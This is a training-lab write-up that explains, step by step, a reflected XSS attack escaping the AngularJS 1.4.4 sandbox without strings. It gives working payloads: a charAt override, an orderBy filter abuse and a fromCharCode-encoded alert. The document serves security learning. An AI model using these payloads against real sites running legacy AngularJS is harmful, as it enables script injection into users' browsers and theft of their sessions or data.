# Reflected XSS with AngularJS sandbox escape without strings

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings), you'll learn: Reflected XSS with AngularJS sandbox escape without strings! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Background

This lab uses [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101072208.png)

In here, we can see there is a search box.

Let's search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101072240.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101072254.png)

As you can, our input is reflected to the web page.

**View source page:**
```html
<script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>
[...]
<section class=blog-header>
    <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
        $scope.query = {};
        var key = 'search';
        $scope.query[key] = 'test';
        $scope.value = $parse(key)($scope.query);
    });</script>
    <h1 ng-controller=vulnCtrl>1 search results for {{value}}</h1>
    <hr>
</section>
```

As you can see, the search functionality is using **AngularJS 1.4.4**. Also, our input is **being rendered as a template: `{{value}}`.**

**Let's try to use an AngularJS sandbox bypass in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101073512.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101073533.png)

However, it doesn't work.

**In the lab's background, it said:**

> This lab uses [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.

**To solve that, we can use `toString()` to create a string without using quotes:**
```js
1&toString()
```

This will **get the `String` prototype.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101073709.png)

**Then, we can use the most well-known escape uses the modified `charAt()` function globally within an expression:**
```js
1&toString().constructor.prototype.charAt=[].join;
```

This will **overwrite the `charAt` function for every string**, thus bypassing AngularJS sandbox.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101073907.png)

**After that, we can use the `orderBy` filter to execute our JavaScript payload:**
```js
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:
```

In here, we're sending the array `[1]` to the `orderBy` filter on the right. The colon signifies an argument to send to the filter.

**Argument:**
```js
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)=1
```

Again, use `toString()` to get the `String` prototype. Then, we use the `fromCharCode` method generate our payload by converting character codes into the string `x=alert(document.domain)`. Because the `charAt` function has been overwritten, AngularJS will allow this code where normally it would not.

**Final payload:**
```js
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)=1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-27/images/Pasted%20image%2020230101075510.png)

Nice!

# What we've learned:

1. Reflected XSS with AngularJS sandbox escape without strings